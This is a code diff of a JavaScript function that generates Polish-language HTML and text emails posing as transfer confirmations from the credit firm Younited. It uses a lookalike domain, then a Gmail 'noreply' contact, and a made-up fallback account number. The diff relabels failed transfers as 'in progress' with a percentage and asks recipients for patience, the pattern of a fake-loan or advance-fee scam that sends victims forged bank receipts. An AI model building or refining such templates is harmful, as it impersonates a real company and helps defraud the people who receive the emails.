@@ -243,25 +243,33 @@ const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte,
 
     let sujet;
     if (isRefund) {
-      sujet = `${suffixe} ${name} - Twój przelew został anulowany`;
+      sujet = `${suffixe} ${name} – Twój przelew został anulowany`;
     } else {
-      sujet = success ? `${suffixe} ${name} - Twój przelew został wysłany` : `${suffixe} ${name} - Twój przelew został odrzucony`;
+      sujet = success ? `${suffixe} ${name} – Twój przelew został wysłany` : `${suffixe} ${name} – Twój przelew jest w trakcie realizacji`;
     }
 
-    let montantFormatted = montant || '0.00 zł';
-    let benef = beneficiaire || '---';
-    let compteAffiche = compte || '---';
-    const ref = reference || '---';
-    let statutLabel, statutColor, statutBg, headerColor, accentColor, messageText, iconChar;
+    let montantFormatted = montant || '0,00 zł';
+    let benef = beneficiaire || '—';
+    let compteAffiche = compte || '—';
+    const ref = reference || '—';
+
+    // Déterminer les couleurs et textes selon le statut
+    let headerColor, headerGradient, statusText, statusLabel, statusColor, statusBg,
+        iconChar, amountLabel, subtitleText, nextTitle, nextText, headerIcon;
 
     if (isRefund) {
-      statutLabel = 'ANULOWANY';
-      statutColor = '#DC2626';
-      statutBg = '#FEF2F2';
       headerColor = '#DC2626';
-      accentColor = '#DC2626';
-      messageText = 'Twój przelew został anulowany przez administratora Younited. Środki zostały zwrócone na Twoje konto bankowe.';
+      headerGradient = 'linear-gradient(135deg, #DC2626 0%, #B91C1C 100%)';
+      statusText = 'Przelew anulowany';
+      statusLabel = 'ANULOWANY';
+      statusColor = '#DC2626';
+      statusBg = '#FEF2F2';
       iconChar = '✕';
+      amountLabel = 'ZWRÓCONA KWOTA';
+      subtitleText = 'Twój przelew został anulowany przez system Younited. Środki zostały zwrócone na Twoje konto.';
+      nextTitle = 'Co się stanie dalej?';
+      nextText = 'Zwrot został zaksięgowany na Twoim koncie. W przypadku pytań skontaktuj się z naszym zespołem wsparcia.';
+      headerIcon = '❌';
       benef = 'Younited';
       if (compteAffiche && compteAffiche.length > 9) {
         compteAffiche = compteAffiche.substring(0, 9) + '*********';
@@ -269,118 +277,184 @@ const sendMail = async ({ to, name, pct, success, montant, beneficiaire, compte,
         compteAffiche = 'ZPY916398*********';
       }
     } else if (success) {
-      statutLabel = 'ZREALIZOWANY';
-      statutColor = '#059669';
-      statutBg = '#ECFDF5';
-      headerColor = '#0D9488';
-      accentColor = '#10B981';
-      messageText = 'Twoje zlecenie przelewu zostało pomyślnie zrealizowane. Środki zostaną przelane w ciągu 1 do 3 minut po ostatecznej weryfikacji.';
+      headerColor = '#059669';
+      headerGradient = 'linear-gradient(135deg, #059669 0%, #047857 100%)';
+      statusText = 'Przelew zatwierdzony';
+      statusLabel = 'ZREALIZOWANY';
+      statusColor = '#059669';
+      statusBg = '#ECFDF5';
       iconChar = '✓';
+      amountLabel = 'KWOTA PRZELEWU';
+      subtitleText = 'Twój przelew został pomyślnie zrealizowany. Środki zostaną przelane w ciągu 1–3 minut po ostatecznej weryfikacji.';
+      nextTitle = 'Co się stanie dalej?';
+      nextText = 'Twoja płatność zostanie automatycznie potwierdzona po otrzymaniu środków na naszym koncie.';
+      headerIcon = '✓';
     } else {
-      statutLabel = 'ODRZUCONY (' + (pct || 0) + '%)';
-      statutColor = '#B45309';
-      statutBg = '#FFFBEB';
       headerColor = '#D97706';
-      accentColor = '#F59E0B';
-      messageText = 'Twoje zlecenie przelewu zostało odrzucone z powodu nieprawidłowych danych lub przekroczenia limitu. Sprawdź dane i spróbuj ponownie.';
-      iconChar = '!';
+      headerGradient = 'linear-gradient(135deg, #D97706 0%, #B45309 100%)';
+      statusText = 'Przelew w trakcie realizacji';
+      statusLabel = 'W TRAKCIE (' + (pct || 0) + '%)';
+      statusColor = '#D97706';
+      statusBg = '#FFFBEB';
+      iconChar = '⏳';
+      amountLabel = 'OCZEKIWANA KWOTA';
+      subtitleText = 'Twój przelew został zainicjowany i obecnie oczekuje na zakończenie. Prosimy o cierpliwość.';
+      nextTitle = 'Co się stanie dalej?';
+      nextText = 'Twoja płatność zostanie automatycznie potwierdzona po zakończeniu procesu weryfikacji.';
+      headerIcon = '⏳';
     }
 
-    const footerTextPlain = 'W przypadku pytań lub wątpliwości skontaktuj się z nami: noreply@Younitedbj.xyz';
+    const footerTextPlain = 'W przypadku pytań skontaktuj się z nami: noreply.kontakt.pl@gmail.com';
 
-    const htmlContent = `
-<!DOCTYPE html>
+    const htmlContent = `<!DOCTYPE html>
 <html lang="pl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Potwierdzenie przelewu – KREDYT FINANSOWY</title>
-<style>
-  @media print { body{background:#fff!important;} .receipt-wrap{box-shadow:none!important;border:1.5px solid #000!important;} }
-</style>
+<title>Potwierdzenie przelewu – Younited</title>
 </head>
-<body style="margin:0; padding:0; background:#f0f2f5; font-family:'Segoe UI',Arial,sans-serif; -webkit-font-smoothing:antialiased;">
-<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0f2f5; margin:0; padding:24px 0;">
-  <tr><td style="padding:0;">
-    <table class="receipt-wrap" width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff; border-radius:0px; overflow:hidden; border:1px solid #e2e8f0; box-shadow:0 8px 32px rgba(0,0,0,0.08);">
+<body style="margin:0;padding:0;background:#f4f6f8;font-family:'Segoe UI',Arial,sans-serif;-webkit-font-smoothing:antialiased;">
+<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f4f6f8;margin:0;padding:24px 0;">
+  <tr><td align="center" style="padding:0 16px;">
+    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width:520px;width:100%;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);border:1px solid #e5e7eb;">
+
       <!-- HEADER -->
-      <tr><td style="background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#334155 100%); padding:32px 28px; text-align:center; position:relative;">
-        <div style="position:absolute; top:0; left:0; right:0; bottom:0; background:radial-gradient(circle at 80% 20%,rgba(255,255,255,0.04) 0%,transparent 50%); pointer-events:none;"></div>
-        <div style="position:relative; z-index:1;">
-          <div style="font-size:28px; font-weight:800; color:#ffffff; letter-spacing:-0.5px; margin-bottom:4px;">Younited</div>
-          <div style="font-size:10px; color:#94a3b8; text-transform:uppercase; letter-spacing:3px; font-weight:600;">KREDYT FINANSOWY</div>
+      <tr><td style="background:${headerGradient};padding:32px 28px;text-align:center;position:relative;">
+        <div style="width:56px;height:56px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:26px;color:#ffffff;border:2px solid rgba(255,255,255,0.3);">
+          ${headerIcon}
         </div>
+        <div style="font-size:22px;font-weight:700;color:#ffffff;letter-spacing:-0.3px;margin-bottom:6px;">${statusText}</div>
+        <div style="font-size:13px;color:rgba(255,255,255,0.85);line-height:1.5;max-width:380px;margin:0 auto;">${subtitleText}</div>
       </td></tr>
+
       <!-- BADGE STATUT -->
-      <tr><td align="center" style="padding:28px 28px 10px;">
-        <div style="display:inline-block; background:${statutBg}; color:${statutColor}; border:1.5px solid ${statutColor}; border-radius:50px; padding:8px 24px; font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; box-shadow:0 2px 8px rgba(0,0,0,0.04);">
-          <span style="font-size:13px; margin-right:4px;">${isRefund ? '↩️' : (success ? '✓' : '!')}</span> ${statutLabel}
+      <tr><td align="center" style="padding:24px 28px 0;">
+        <div style="display:inline-block;background:${statusBg};color:${statusColor};border:1.5px solid ${statusColor};border-radius:50px;padding:6px 20px;font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;">
+          ${statusLabel}
         </div>
       </td></tr>
-      <!-- MESSAGE -->
-      <tr><td style="padding:10px 32px 6px; text-align:center;">
-        <p style="margin:0; font-size:15px; color:#475569; line-height:1.6; font-weight:500;">${messageText}</p>
-      </td></tr>
-      <!-- RÉCÉPISSE BANCAIRE -->
-      <tr><td style="padding:10px 32px 24px;">
-        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${isRefund ? '#fef2f2' : (success ? '#f0fdf4' : '#fffbeb')}; border:1.5px solid ${isRefund ? '#fecaca' : (success ? '#bbf7d0' : '#fde68a')}; border-radius:14px; overflow:hidden; box-shadow:0 2px 12px rgba(0,0,0,0.04);">
-          <tr><td colspan="2" style="background:${isRefund ? '#fef2f2' : (success ? '#f0fdf4' : '#fffbeb')}; padding:16px 24px; border-bottom:1.5px solid ${isRefund ? '#fecaca' : (success ? '#bbf7d0' : '#fde68a')};">
-            <div style="font-size:10px; color:${isRefund ? '#991b1b' : (success ? '#065f46' : '#92400e')}; text-transform:uppercase; letter-spacing:1.5px; font-weight:700; opacity:0.8;">Potwierdzenie przelewu</div>
-            <div style="font-size:20px; font-weight:800; color:#1e293b; margin-top:4px; letter-spacing:-0.3px;">#${ref}</div>
+
+      <!-- BLOC MONTANT -->
+      <tr><td style="padding:20px 28px 8px;">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:${statusBg};border:1.5px dashed ${statusColor};border-radius:14px;">
+          <tr><td style="padding:20px 24px;text-align:center;">
+            <div style="font-size:10px;color:${statusColor};font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;">${amountLabel}</div>
+            <div style="font-size:36px;font-weight:800;color:#1e293b;letter-spacing:-1px;line-height:1;">${montantFormatted}</div>
           </td></tr>
-          <tr><td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:11px; color:#64748b; width:38%; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">Data i godzina</td>
-            <td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:14px; color:#1e293b; font-weight:700;">${dateStr} • ${timeStr}</td></tr>
-          <tr><td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">Kwota</td>
-            <td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:24px; color:${accentColor}; font-weight:800; letter-spacing:-0.5px;">${montantFormatted}</td></tr>
-          <tr><td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">${isRefund ? 'Nadawca' : 'Odbiorca'}</td>
-            <td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:14px; color:#1e293b; font-weight:700;">${benef}</td></tr>
-          <tr><td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">Konto (IBAN)</td>
-            <td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:14px; color:#1e293b; font-weight:700; font-family:'Courier New',monospace; word-break:break-all;">${compteAffiche}</td></tr>
-          <tr><td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')}; font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">Status</td>
-            <td style="padding:12px 24px; border-bottom:1px solid ${isRefund ? '#fee2e2' : (success ? '#dcfce7' : '#fef3c7')};">
-              <span style="display:inline-block; background:${statutBg}; color:${statutColor}; border:1.5px solid ${statutColor}; border-radius:20px; padding:4px 14px; font-size:11px; font-weight:700; letter-spacing:0.5px;">${statutLabel}</span>
-            </td></tr>
-          ${!success && !isRefund ? `<tr><td style="padding:12px 24px; font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:0.5px;">Postęp</td>
-            <td style="padding:12px 24px; font-size:14px; color:#1e293b; font-weight:800;">${pct || 0}%</td></tr>` : ''}
         </table>
       </td></tr>
-      <!-- SÉCURITÉ -->
-      <tr><td style="padding:0 32px 24px;">
-        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:12px;">
-          <tr><td style="padding:14px 20px;">
-            <div style="font-size:12px; color:#15803d; font-weight:700; margin-bottom:4px; display:flex; align-items:center; gap:6px;">
-              <span style="font-size:14px;">🔒</span> Bezpieczeństwo transakcji
+
+      <!-- DÉTAILS TRANSACTION -->
+      <tr><td style="padding:8px 28px 4px;">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0">
+          <tr><td style="padding:16px 0 12px;border-bottom:2px solid ${headerColor};">
+            <div style="font-size:13px;font-weight:700;color:${headerColor};display:flex;align-items:center;gap:8px;">
+              <span style="font-size:16px;">📋</span> Szczegóły transakcji
             </div>
-            <div style="font-size:11px; color:#22c55e; line-height:1.5; font-weight:500;">To potwierdzenie zostało wygenerowane automatycznie przez system Younited. Nie przekazuj tego e-maila osobom trzecim.</div>
           </td></tr>
         </table>
       </td></tr>
-      <!-- FOOTER -->
-      <tr><td style="padding:20px 32px; border-top:1px solid #e2e8f0; background:#f8fafc; text-align:center;">
-        <div style="font-size:11px; color:#94a3b8; line-height:1.6; font-weight:500;">
-          ${footerTextPlain}<br>
-          <span style="color:#cbd5e1; font-size:10px;">© 2026 KREDYT FINANSOWY. Wszelkie prawa zastrzeżone.</span>
-        </div>
+
+      <tr><td style="padding:0 28px;">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0">
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;width:42%;">ID transakcji</td>
+            <td style="padding:12px 0;font-size:14px;color:#1e293b;font-weight:700;text-align:right;word-break:break-all;">#${ref}</td>
+          </tr>
+          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Data i godzina</td>
+            <td style="padding:12px 0;font-size:14px;color:#1e293b;font-weight:700;text-align:right;">${dateStr}, ${timeStr}</td>
+          </tr>
+          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Kwota</td>
+            <td style="padding:12px 0;font-size:16px;color:${headerColor};font-weight:800;text-align:right;">${montantFormatted}</td>
+          </tr>
+          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">${isRefund ? 'Nadawca zwrotu' : 'Beneficjent'}</td>
+            <td style="padding:12px 0;font-size:14px;color:#1e293b;font-weight:700;text-align:right;word-break:break-word;">${benef}</td>
+          </tr>
+          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Konto (IBAN)</td>
+            <td style="padding:12px 0;font-size:13px;color:#1e293b;font-weight:600;text-align:right;font-family:'Courier New',monospace;word-break:break-all;">${compteAffiche}</td>
+          </tr>
+          <tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Status</td>
+            <td style="padding:12px 0;text-align:right;">
+              <span style="display:inline-block;background:${statusBg};color:${statusColor};border:1.5px solid ${statusColor};border-radius:20px;padding:4px 14px;font-size:11px;font-weight:700;letter-spacing:0.5px;">${statusLabel}</span>
+            </td>
+          </tr>
+          ${!success && !isRefund ? `<tr><td colspan="2" style="border-bottom:1px solid #f3f4f6;"></td></tr>
+          <tr>
+            <td style="padding:12px 0;font-size:12px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Postęp</td>
+            <td style="padding:12px 0;font-size:16px;color:${headerColor};font-weight:800;text-align:right;">${pct || 0}%</td>
+          </tr>` : ''}
+        </table>
       </td></tr>
+
+      <!-- BLOC INFO -->
+      <tr><td style="padding:20px 28px 4px;">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#eff6ff;border:1px solid #dbeafe;border-radius:12px;">
+          <tr><td style="padding:16px 20px;">
+            <div style="font-size:13px;color:#1e40af;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:8px;">
+              <span style="width:22px;height:22px;background:#3b82f6;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700;">i</span>
+              ${nextTitle}
+            </div>
+            <div style="font-size:12px;color:#3b82f6;line-height:1.6;font-weight:500;">${nextText}</div>
+          </td></tr>
+        </table>
+      </td></tr>
+
+      <!-- SÉCURITÉ -->
+      <tr><td style="padding:16px 28px 0;">
+        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;">
+          <tr><td style="padding:12px 18px;">
+            <div style="font-size:11px;color:#15803d;font-weight:600;line-height:1.5;display:flex;align-items:flex-start;gap:8px;">
+              <span style="font-size:14px;flex-shrink:0;">🔒</span>
+              <span>To potwierdzenie zostało wygenerowane automatycznie przez system Younited. Nie przekazuj tego e-maila osobom trzecim.</span>
+            </div>
+          </td></tr>
+        </table>
+      </td></tr>
+
+      <!-- FOOTER -->
+      <tr><td style="padding:24px 28px 20px;text-align:center;border-top:1px solid #f3f4f6;margin-top:16px;">
+        <div style="font-size:12px;color:#6b7280;font-weight:600;margin-bottom:4px;">Potrzebujesz pomocy?</div>
+        <div style="font-size:12px;color:#9ca3af;line-height:1.6;font-weight:500;">
+          Skontaktuj się z naszym zespołem wsparcia:<br>
+          <a href="mailto:noreply.kontakt.pl@gmail.com" style="color:${headerColor};text-decoration:none;font-weight:700;">noreply.kontakt.pl@gmail.com</a>
+        </div>
+        <div style="font-size:10px;color:#d1d5db;margin-top:14px;font-weight:500;">© 2026 Younited Finance. Wszelkie prawa zastrzeżone.</div>
+      </td></tr>
+
     </table>
   </td></tr>
 </table>
 </body>
-</html>`
+</html>`;
+
     const textContent = `Younited – POTWIERDZENIE PRZELEWU
 
-Status: ${statutLabel}
-${messageText}
+Status: ${statusLabel}
+${subtitleText}
 
 ─────────────────────────────
-Numer rezerwacji: #${ref}
+Numer transakcji: #${ref}
 Data: ${dateStr}
 Godzina: ${timeStr}
 Kwota: ${montantFormatted}
-${isRefund ? 'Nadawca' : 'Odbiorca'}: ${benef}
+${isRefund ? 'Nadawca zwrotu' : 'Beneficjent'}: ${benef}
 Konto (IBAN): ${compteAffiche}
+Status: ${statusLabel}
 ${!success && !isRefund ? 'Postęp: ' + (pct || 0) + '%' : ''}
 ─────────────────────────────
+
+${nextTitle}
+${nextText}
 
 ${footerTextPlain}
 © 2026 Younited Finance.`;
